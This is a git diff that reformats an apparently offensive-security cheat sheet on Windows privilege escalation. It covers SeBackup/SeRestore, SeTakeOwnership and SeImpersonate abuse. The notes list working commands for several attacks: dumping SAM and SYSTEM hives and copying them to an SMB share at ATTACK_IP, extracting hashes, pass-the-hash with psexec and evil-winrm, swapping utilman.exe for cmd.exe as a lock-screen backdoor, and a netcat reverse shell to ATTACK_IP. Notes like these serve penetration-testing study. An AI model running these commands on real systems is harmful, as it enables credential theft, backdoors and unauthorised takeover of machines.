@@ -1,80 +1,82 @@
-# Privilege check command: whoami /priv
+# Windows Privileges
 
-# Examples of dangerous privileges:
+## Privilege check command: whoami /priv
 
-## SeBackup/SeRestore
+## Examples of dangerous privileges:
+
+### SeBackup/SeRestore
 
 #### 1: Backup SAM and SYSTEM hashes
 
- - cd /
+    cd /
 
- - mkdir temp
+    mkdir temp
 
- - cd temp
+    cd temp
 
- - req save hklm\system c:\temp\system
+    req save hklm\system c:\temp\system
 
- - req save hklm\sam c:\temp\sam
+    req save hklm\sam c:\temp\sam
 
- - download sam
+    download sam
 
- - download system
+    download system
 
 #### 2: Create SMB Server on attacking machine
 
- - 1: mkdir share
+    mkdir share
 
- - 2: impacket-smbserver -smb2support -username USER -password PASSWORD public share
+    impacket-smbserver -smb2support -username USER -password PASSWORD public share
 
 #### 3: Copy backups to share folder
 
-- copy c:\users\user\sam.hive \\ATTACK_IP\public\
+    copy c:\users\user\sam.hive \\ATTACK_IP\public\
 
-- copy c:\users\user\system.hive \\ATTACK_IP\public\
+    copy c:\users\user\system.hive \\ATTACK_IP\public\
 
 #### 4: Retrieve hashes
 
- - impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+    impacket-secretsdump -sam sam.hive -system system.hive LOCAL
 
 ## OR 
 
- - pypykatz registry --sam sam system
+    pypykatz registry --sam sam system
 
 #### 5: Pass-The-Hash Attack (PtH)
 
-- impacket-psexec -hashes HASH administrator@TARGET_IP
+    impacket-psexec -hashes HASH administrator@TARGET_IP
 
 #### TIP: We can also use evil-winrm for PtH attacks.
 
-- evil-winrm -i TARGET_IP -u administrator -H 'NTLM_HASH'
+    evil-winrm -i TARGET_IP -u administrator -H 'NTLM_HASH'
 
 ## Alternate Method to transfer the Hives: reg.py  remotely on Linux
 
- - python smbserver.py -smb2support share /tmp
+    python smbserver.py -smb2support share /tmp
 
- - reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SAM' -o '\\attacker ip\share'
+    reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SAM' -o '\\attacker ip\share'
 
- - reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SYSTEM' -o '\\attacker ip\share'
+    reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SYSTEM' -o '\\attacker ip\share'
 
- - reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SECURITY' -o '\\attacker ip\share'
+    reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SECURITY' -o '\\attacker ip\share'
 
 ## Alternate Method: SeBackupPrivilegeUtils https://github.com/giuliano108/SeBackupPrivilege
 
 ### Usage:
 
- - Import-Module .\SeBackupPrivilegeUtils.dll
+    Import-Module .\SeBackupPrivilegeUtils.dll
 
- - Import-Module .\SeBackupPrivilegeCmdLets.dll
+    Import-Module .\SeBackupPrivilegeCmdLets.dll
 
- - Set-SeBackupPrivilege
+    Set-SeBackupPrivilege
 
- - Get-SeBackupPrivilege
+    Get-SeBackupPrivilege
 
 ## Alternate Method: Robocopy
 
- - robocopy C:\Users\Administrator\Desktop C:\Users\Public root.txt /B
+    robocopy C:\Users\Administrator\Desktop C:\Users\Public root.txt /B
 
- - type C:\Users\Public\root.txt
+    type C:\Users\Public\root.txt
 
 ## SeTakeOwnership
 
@@ -82,13 +84,19 @@
 
 ### Example: Utilman.exe
 
-#### 1: takeown /f c:\windows\system32\utilman.exe
+#### 1: 
 
-#### 2: icacls c:\windows\system32\utilman.exe /grant USER:F
+    takeown /f c:\windows\system32\utilman.exe
 
-#### 3: copy cmd.exe utilman.exe
+#### 2: 
 
-#### 4: Trigger uitlman : Lock screen, click ease of access
+    icacls c:\windows\system32\utilman.exe /grant USER:F
+
+#### 3: 
+
+    copy cmd.exe utilman.exe
+
+#### 4: Trigger utilman : Lock screen, click ease of access
 
 ## SeImpersonate/SeAssignPrimaryToken
 
@@ -98,7 +106,7 @@
 
 #### 1: Start listener
 
-#### c:\path\to\roguewinrm\roguewinrm.exe -p "C:\path\to\nc64.exe" -a "-e cmd.exe ATTACK_IP PORT"
+    c:\path\to\roguewinrm\roguewinrm.exe -p "C:\path\to\nc64.exe" -a "-e cmd.exe ATTACK_IP PORT"
 
 ## Tool: PrintSpoofer
 
@@ -122,13 +130,19 @@ Run the script to get system
 
 ### Steps:
 
-#### 1) Get-Process winlogon (Check for a specific SYSTEM level process running on the machine)
+#### 1) 
+
+    Get-Process winlogon (Check for a specific SYSTEM level process running on the machine)
 
 #### 2) Download and execute Meterpreter on target machine to connect to us
 
-#### 3) ps (Check for processes running as SYSTEM. Example: winlogon.exe)
+#### 3) 
 
-#### 4) migrate PID (Take ownership of the elevated process)
+    ps (Check for processes running as SYSTEM. Example: winlogon.exe)
+
+#### 4) 
+
+    migrate PID (Take ownership of the elevated process)
 
 #### 5) VOILA!
 
